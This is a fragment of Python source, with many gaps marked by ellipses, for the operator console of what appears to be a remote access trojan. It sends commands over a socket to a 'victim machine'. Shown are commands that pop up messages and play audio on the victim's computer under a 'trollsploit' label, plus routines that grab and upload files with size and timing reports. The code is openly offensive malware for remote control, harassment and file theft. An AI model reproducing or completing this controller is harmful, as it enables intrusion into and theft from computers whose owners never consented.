        ...
        while True:
            try:
                ...
                # Shows Help List Of Availiable Commands
                    ...
                    try:
                        conn.send(command.encode('utf-8'))
                        print(Style.BRIGHT + Fore.RED + '[!]' + Style.BRIGHT + Fore.GREEN + 'Enter Audio Name')
                        audioname = input(Style.BRIGHT + Fore.RED + ':> ')
                        conn.send(audioname.encode('utf-8'))
                        print(Style.BRIGHT + Fore.RED + '[!]' + Style.BRIGHT + Fore.GREEN + 'Note that while the song is plaing you wont be able to do anything until the song or audio is over!')
                    except:
                        'null'
                ...
                elif 'trollsploit.message' in command:
                    try:
                        conn.send(command.encode('utf-8'))
                        print(Style.BRIGHT + Fore.RED + '[!]' + Style.BRIGHT + Fore.MAGENTA + 'Enter The Message That You Wish To Be Displayed In A Popup Box On The Victim Machine')
                        main_message = input(Style.BRIGHT + Fore.RED + ':> ')
                        conn.send(main_message.encode('utf-8'))
                        print(Style.BRIGHT + Fore.RED + '[+]' + Style.BRIGHT + Fore.MAGENTA +  'Sent Successfully')
                    except:
                        'null'
                ...
                #         'null'
                    ...
                    print(Style.BRIGHT + Fore.MAGENTA + "[+]" + Style.BRIGHT + Fore.GREEN + " Total: " + str(int(file_size)/1024) + Style.BRIGHT + Fore.RED + " KB")
                    ...
                    # Show Time
                    print(Style.BRIGHT + Fore.MAGENTA + "[+] File Grabbed. Total time: ", end_time - start_time)
                    ...
                    print(Style.BRIGHT + Fore.MAGENTA + "[+]" + Style.BRIGHT + Fore.GREEN + "Uploading [" + str(file_size/1024) + "] KB")
                    ...
                    with open(file_name, "rb") as file:
                        ...
                        print(Style.BRIGHT + Fore.MAGENTA + "[+]" + Style.BRIGHT + Fore.GREEN + "File Transferred. Total time: ", end_time - start_time)
                ...
                # Otherwise If Command Is Not Null
                    ...
                    print(Style.BRIGHT + Fore.RED + '\n[-]' + Style.BRIGHT + Fore.GREEN + ' Exiting')
                    sys.exit(0)
